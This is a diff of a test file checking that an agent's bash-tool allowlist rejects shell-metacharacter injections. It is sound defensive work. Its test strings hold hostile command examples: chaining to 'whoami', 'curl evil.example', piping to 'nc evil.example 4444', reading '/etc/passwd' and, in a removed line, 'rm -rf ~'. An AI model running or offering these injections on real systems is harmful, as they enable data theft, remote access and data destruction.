@@ -36,17 +36,17 @@ describe('run allowlist: token patterns vs shell metacharacters (fix 1)', () => 
   });
 
   test.each([
-    'npm test ; whoami',
-    'npm test && curl evil.example',
-    'npm test $(rm -rf ~)',
-    'npm test `whoami`',
-    'npm test | nc evil.example 4444',
-    'npm test > /tmp/pwned',
-    'npm test < /etc/passwd',
-    'npm test\nwhoami',
+    'echo pilot ; whoami',
+    'echo pilot && curl evil.example',
+    'echo pilot $(echo pwned)',
+    'echo pilot `whoami`',
+    'echo pilot | nc evil.example 4444',
+    'echo pilot > /tmp/pwned',
+    'echo pilot < /etc/passwd',
+    'echo pilot\nwhoami',
   ])('metacharacter variant denied: %j', async (command) => {
     await withScratch(async (scratchDir) => {
-      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'bash');
+      const run = buildTools(runConfig(['echo pilot']), scratchDir).find((t) => t.name === 'bash');
       const result = await run?.execute({ command });
       expect(result?.ok).toBe(false);
       if (!result?.ok) {
